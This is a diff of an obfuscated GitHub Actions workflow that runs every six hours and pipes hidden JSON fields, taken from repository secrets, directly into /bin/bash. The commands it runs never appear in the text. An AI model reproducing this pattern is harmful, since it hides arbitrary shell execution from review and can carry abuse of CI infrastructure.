@@ -3,24 +3,19 @@ name: renwozui3817
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 5/6 * * *'
+    - cron: '38 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: renwozui3817
         env:
-          uop7831: ${{ secrets.uop7831 }}
+          buru3971: ${{ secrets.buru3971 }}
         run: |
-          echo $uop7831 | jq -r .enm3 | /bin/bash
-          echo $pzs4217 | jq -r .kvix62 | /bin/bash
-          echo $kmdam26865 | jq -r .gkmpa00402 | /bin/bash
-          echo $wktb99 | jq -r .mpyw3 | /bin/bash
-          echo $m8311 | jq -r .cdao53097 | /bin/bash
-          echo $uzyq75 | jq -r .gyifr29 | /bin/bash
-          echo $mp83570 | jq -r .crnna40 | /bin/bash
-          echo $cepld73311 | jq -r .wvu29 | /bin/bash
-          echo $ckq216 | jq -r .li171 | /bin/bash
+          echo $buru3971 | jq -r .mhekw50 | /bin/bash
+          echo $nfp81974 | jq -r .rjrpz8 | /bin/bash
+          echo $y8878 | jq -r .cw503 | /bin/bash
+          echo $tsldv71 | jq -r .jntuy1 | /bin/bash
+          echo $vwd153 | jq -r .z231 | /bin/bash
 
